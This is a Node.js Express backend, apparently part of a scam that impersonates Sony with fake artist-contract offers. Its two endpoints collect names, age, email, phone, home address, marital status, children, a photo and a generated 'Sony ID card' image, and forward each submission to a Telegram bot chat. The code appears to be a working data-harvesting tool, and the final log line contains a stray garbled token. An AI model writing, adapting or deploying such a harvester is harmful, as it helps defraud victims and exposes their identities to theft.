require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const multer = require('multer');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 10000;

// SET THESE IN RENDER DASHBOARD
const BOT_TOKEN = process.env.BOT_TOKEN;
const SUPERVISOR_CHAT_ID = process.env.SUPERVISOR_CHAT_ID;

app.use(cors({ origin: "*" }));

// for JSON (fallback) + urlencoded
app.use(express.json({ limit: '20mb' }));
app.use(express.urlencoded({ extended: true, limit: '20mb' }));

// for multipart with image
const upload = multer({ 
  storage: multer.memoryStorage(),
  limits: { fileSize: 10 * 1024 * 1024 } // 10MB max
});

app.get("/", (req, res) => {
  res.send(`<h1>Sony Backend Live ✓</h1><p>POST /api/forward-to-telegram (with photo)</p><p>POST /api/forward-idcard (ID card PNG)</p>`);
});

app.get("/health", (req, res) => res.send("OK"));

// HELPER: send text + optional photo to Telegram
async function sendToTelegram({ text, photoBuffer, photoFilename, caption }) {
  if (!BOT_TOKEN || !SUPERVISOR_CHAT_ID) {
    console.log("Missing env:", text);
    return { ok: false, note: "Set BOT_TOKEN and SUPERVISOR_CHAT_ID" };
  }

  // 1. If we have photo buffer, send as photo with caption
  if (photoBuffer) {
    const form = new FormData();
    form.append('chat_id', SUPERVISOR_CHAT_ID);
    form.append('photo', photoBuffer, { filename: photoFilename || 'photo.jpg', contentType: 'image/jpeg' });
    form.append('caption', caption || text);
    form.append('parse_mode', 'Markdown');

    const resp = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
      headers: form.getHeaders()
    });
    return resp.data;
  } else {
    // 2. Just text
    const resp = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: SUPERVISOR_CHAT_ID,
      text: text,
      parse_mode: "Markdown"
    });
    return resp.data;
  }
}

// MAIN: form + image
app.post("/api/forward-to-telegram", upload.single('photo'), async (req, res) => {
  try {
    // supports both JSON and multipart
    const body = req.body || {};
    const { 
      artistName, legalName, age, email, phone, address, married, kids, kidsNum, region, contractId,
      photoBase64, aid, givenId
    } = body;

    if (!artistName || !legalName) {
      return res.status(400).json({ error: "Missing artistName/legalName" });
    }

    const text = `
🎤 *NEW SONY CONTRACT SUBMISSION* 🎤
━━━━━━━━━━━━━━━━━━━━
👤 *Artist:* ${artistName}
📛 *Legal:* ${legalName}
🎂 *Age:* ${age || 'N/A'}
📧 *Email:* ${email || 'N/A'}
📱 *Phone:* ${phone || 'N/A'}
🏠 *Address:* ${address || 'N/A'}
💍 *Married:* ${married || 'N/A'}
👶 *Kids:* ${kids || 'N/A'} ${kidsNum && kidsNum !== '0' ? '('+kidsNum+')' : ''}
🌍 *Country:* ${region || 'N/A'}
🆔 *Contract:* \`${contractId || 'N/A'}\`
🎫 *Given ID:* \`${aid || givenId || 'N/A'}\`
⏰ *Time:* ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━
✅ With artist photo attached
`;

    let photoBuffer = null;
    let filename = `SONY_${artistName.replace(/\s+/g,'_')}.jpg`;

    // priority 1: multer file
    if (req.file && req.file.buffer) {
      photoBuffer = req.file.buffer;
      filename = req.file.originalname || filename;
    } 
    // priority 2: base64 fallback from frontend
    else if (photoBase64 && photoBase64.startsWith('data:image')) {
      const base64Data = photoBase64.split(';base64,').pop();
      photoBuffer = Buffer.from(base64Data, 'base64');
    }

    const result = await sendToTelegram({ 
      text, 
      photoBuffer, 
      photoFilename: filename,
      caption: text.slice(0, 1024) // Telegram caption limit
    });

    console.log("Forwarded:", result.ok);
    res.json({ success: true, forwarded: true, hasPhoto: !!photoBuffer });

  } catch (e) {
    console.error(e.response?.data || e.message);
    res.status(500).json({ error: "Failed", details: e.response?.data || e.message });
  }
});

// NEW: ID CARD PNG endpoint (for DONE button)
app.post("/api/forward-idcard", upload.single('photo'), async (req, res) => {
  try {
    const { artistName, contractId, givenId, phone, type } = req.body || {};
    const photoBuffer = req.file ? req.file.buffer : null;

    if (!photoBuffer) {
      return res.status(400).json({ error: "No ID card image received" });
    }

    const caption = `
🪪 *SONY ID CARD GENERATED* 🪪
━━━━━━━━━━━━━━━
👤 *Artist:* ${artistName || 'Unknown'}
🆔 *Contract:* \`${contractId || 'N/A'}\`
🎫 *Given ID:* \`${givenId || 'N/A'}\`
📱 *Phone:* ${phone || 'N/A'}
🏷 *Type:* ${type || 'PREMIUM'}
⏰ *${new Date().toLocaleString()}*
━━━━━━━━━━━━━━━
⬇️ *HD PNG attached*
`;

    const form = new FormData();
    form.append('chat_id', SUPERVISOR_CHAT_ID);
    form.append('document', photoBuffer, { 
      filename: `SONY_ID_${(artistName||'Artist').replace(/\s+/g,'_')}_${contractId||'ID'}.png`,
      contentType: 'image/png'
    });
    form.append('caption', caption);
    form.append('parse_mode', 'Markdown');

    if (!BOT_TOKEN || !SUPERVISOR_CHAT_ID) {
      return res.json({ success: true, forwarded: false, note: "Set env vars" });
    }

    const resp = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
      headers: form.getHeaders()
    });

    console.log("ID Card sent:", resp.data.ok);
    res.json({ success: true, forwarded: true });

  } catch (e) {
    console.error(e.response?.data || e.message);
    res.status(500).json({ error: "Failed ID card", details: e.response?.data || e.message });
  }
});

app.listen(PORT, () => console.log(`【entity-Sony¦canonical_name=SONY】 bot running on ${PORT} ✓ Photo + ID Card enabled`));